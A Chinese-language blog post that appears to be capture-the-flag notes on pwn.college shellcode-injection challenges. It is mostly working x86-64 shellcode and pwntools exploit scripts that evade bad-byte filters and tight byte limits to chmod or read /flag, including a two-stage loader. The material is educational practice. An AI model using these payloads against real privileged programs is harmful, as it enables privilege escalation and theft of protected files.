---
title: pwn.college 学习随笔：Shellcode 注入
date: '2026-11-08 21:10:00'
description: pwn.college shellcode 模块笔记：badchar 绕过、字节预算 18/12/6、clobbercode 与字节不重复约束
categories: [CTF]
tags: [pwn, shellcode, pwn.college, WriteUp]
---
## 前言

> 这是 pwn.college [Shellcoding Challenge](https://pwn.college/program-security/program-security/) 模块的随手笔记。
>
> 代码里的 `from pwnstart import *` 是本地的一个封装，本文中基本只用到 start()。你可以看作一个会自己（按照 pwn.college 常见的情况）在 /challenge 下查找目标可执行文件的 process()。

## 绕过 `\x48`（REX.W 前缀）

凡是"以 64 位通用寄存器为操作数"的指令，几乎都要带它。

思路：用 eax / al 这些；用 push / pop 来代替 mov

```python
xor edx, edx
push rdx        /* 填 0x0 作为字符串结尾 */
mov dword ptr [rsp], 0x616c662f
mov byte ptr [rsp + 4], 0x67
push rsp
pop rdi
xor esi, esi
mov al, 2
syscall
```

## 绕过 syscall：`\x0f\x05`

```python
/* ---- 1. 把 stub 处的 nop nop 改写成 syscall(0f 05) ---- */
lea rbx, [rip + stub]        /* 48 8d 1d <disp> */           
xor eax, eax                                                 
mov al, 0x0e                 /* b0 0e  0x0e */               
inc eax                      /* ff c0  -> 0x0f */            
mov byte ptr [rbx], al       /* 88 03 */                     
mov al, 4                    /* b0 04 */                     
inc eax                      /* ff c0  -> 0x05 */            
mov byte ptr [rbx+1], al     /* 88 43 01 */

...

stub:                                    
    nop                          /* 90 */
    nop                          /* 90 */
    ret                          /* c3 */
```

## syscall 是 badchar，且栈前 0x1000 字节被 mmap 去掉了写权限

```python
sc = """
        /* lea rbx, [rip + stub] */
        push 0x207fe000         # 题目泄露的地址加一页: d000 -> e000
        pop rbx

        xor eax, eax
        mov al, 0x0e
        inc eax
        mov byte ptr [rbx], al
        mov al, 0x04
        inc eax
        mov byte ptr [rbx + 1], al

        xor edx, edx
        push rdx
        mov dword ptr [rsp], 0x616c662f
        mov byte ptr [rsp + 4], 0x67
        push rsp
        pop rdi
        xor esi, esi
        xor eax, eax
        mov al, 2
        call rbx

        mov edi, eax
        push rsp
        pop rsi
        xor edx, edx
        mov dh, 1
        xor eax, eax
        call rbx

        mov edx, eax
        push rsp
        pop rsi
        mov edi, 1
        mov eax, 1
        call rbx
"""

shellcode = asm(sc).ljust(0x1000, b'\x90') + asm("nop; nop; ret")
# 用 ljust 把 nop; nop; ret 刚好放到 e000
```

## 限制 18 字节

限制 shellcode 长度为 18，多的会被截断。

思路是调用 `chmod 444 /flag`，然后自己 `cat /flag`

其实可以只 `chmod 4`，也就是 `004` `others`。

```python
from pwnstart import *

sc1 = """
        mov al, 90
        mov edi, 0x1b55500d     # 题目泄露的固定地址 + 13，到 .ascii /flag 处
        mov si, 292
        syscall
        .ascii "/flag"
"""
# 18 bytes
```

`python bb.py && cat /flag`

```python
sc2 = """
        mov edi, 0x67616c66     # 这里省了一个 "/"，先 cd / 再执行。(这也可以吗？？？)
        push rdi
        mov rdi, rsp
        mov al, 90
        mov si, 292
        syscall
"""
# 17 bytes，可以在前面补一个 nop
```

`cd / && python ~/bb.py && cat /flag`

## clobbercode：每 10 字节被覆写成 \x0c（int3）

思路：在可用的 10 个字节的末尾用 jmp +10 跳过不可用段。

```python
from pwnstart import *

sc = [
    "mov rsi, 4",
    "push 0x67616c66",
    "mov byte ptr [rsp-1], 0x2f",
    "lea rdi, [rsp-1]",
    "xor eax, eax",
    "mov al, 90",
    "syscall"
]

shellcode = b""

for i in sc:
    chunk = asm(i)
    l = len(chunk)
    assert l < 9
    chunk = chunk + b'\x90' * (8 - l) + b"\xeb\x0a"
    shellcode += chunk
    shellcode += b'\x90' * 10

print(disasm(shellcode))

io = start()

io.recvuntil(b"Reading 0x1000 bytes from stdin")

io.send(shellcode)

io.interactive()
```

`cat /flag`

## 所有字节不能重复

思路：越短越好。然后用上神秘的先 `cd /` 省一个字节的技巧...

```python
from pwnstart import *

sc = """
    mov sil, 0x4
    push 0x67616c66
    mov rdi, rsp
    xor eax, eax
    mov al, 90
    syscall
"""

shellcode = asm(sc)

print(shellcode)
print(disasm(shellcode))

io = start()

io.recvuntil(b"Reading 0x1000 bytes from stdin")

io.send(shellcode)

io.interactive()
```

`cd / && python ~/diverse_delivery.py && cat /flag`

## 限制 12 字节

Plan A:

先造一个 link，又可以省字节（真的是这么做的吗...）

`cd ~ && ln -sf /flag f`

```asm
push 0x66   
mov rdi, rsp
mov al, 90  
push 4      
pop rsi     
syscall     
```

Plan B:

<https://kunalwalavalkar.gitbook.io/write-ups/pwn-college/shellcode-injection#level-8>

先写 chmod_flag.c:

```c
#include<sys/stat.h>
void main() {
    chmod("/flag", 0444);
}
```

编译:

`gcc chmod_flag.c -o \;`

我们就得到了一个叫 ";" 的可执行文件。

由于 `syscall` 和 `;` 都是 `0x3b`！

```asm
sc = """
    mov al, 0x3b
    push rax
    mov rdi, rsp 
    xor esi, esi
    xor edx, edx
    syscall
"""
```

刚刚好 12 bytes！

```python
from pwnstart import *

sc = """
    mov al, 0x3b
    push rax
    mov rdi, rsp
    xor esi, esi
    xor edx, edx
    syscall
"""

shellcode = asm(sc)

init("/challenge/pocket-payload")
io = start()

io.recvuntil(b"Reading 0xc bytes from stdin.")

io.send(shellcode)
```

## 限制 6 字节（多阶段 shellcode）
   
需要多阶段 shellcode

stage1:

反汇编，由于:

```asm
17b9:  48 89 c2        mov rdx, rax
17bc:  b8 00 00 00 00  mov eax, 0x0
17c1:  ff d2           call rdx    
```

- rax 进 shellcode 时是 0
- rdx 进 shellcode 时等于 shellcode 地址

我们就可以借此花 6 字节再写一个 `read`:

```asm
xor edi, edi
push rdx
pop rsi
syscall
```

然后在二阶段里就不受限制了。

注意 `rip` 的位置已经增加了 6，但我们二阶段被 `read` 的位置是和一阶段的 `shellcode` 开始的位置一样的。所以要垫 6 个字节，这样 `rip` 才会顺着往下走二阶段（并且最终走到 `mmap` 页的终点然后 `SIGSEGV`）。

```python
from pwnstart import *

# 进入 shellcode 时的寄存器:          
# rax = 0x0 正好是 read 的调用号
# rdx = 0x2c0a3000 shellcode 自己的地址
# rsi / rdi 为垃圾值  

stage1 = asm("""
    xor edi, edi
    push rdx
    pop rsi
    syscall
""")

stage2 = asm("""
    mov rsi, 4
    push 0x67616c66
    mov byte ptr [rsp-1], 0x2f
    lea rdi, [rsp-1]
    xor eax, eax
    mov al, 90
    syscall
""")

payload = stage1 + b"\x90" * 6 + stage2

io = start()
io.recvuntil(b"Reading 0x6 bytes from stdin")
io.send(payload)
io.shutdown("send")         # 关键：EOF，否则第二次 read 会一直挂着
print(io.recvall(timeout=5).decode(errors="replace"))

try:
    flag = open("/flag").read().strip()
except PermissionError:
    log.failure("Failed")
    sys.exit(1)
log.success("flag: %s", flag)
```

## 后记

Shellcoding is Art.

此前一直坚持着 `ssh dojo` (让 AI 写的 ssh 配置)，然后 `nvim exp.py`。但无奈这个约 300ms 的延迟放到每一次打字上实在是太痛苦了...现在采用的方案是本地用 `wsl` 环境的 `code` 来写 `shellcode` 并测试是否满足条件，确定之后就加上 `io = start()` 一大堆，然后用一个 send（让 AI 写的...alias 吧）发到 `dojo` 去跑。我在想能不能直接拿 `pwn.college` 的源码（应该是开源的）然后在本地搭建测试环境？不对但是最终想要拿到 `flag` 这么搞肯定也不行...

可恶的延迟。事实说明 `ssh` 和 FPS 在对延迟的要求上似乎也没有什么区别。
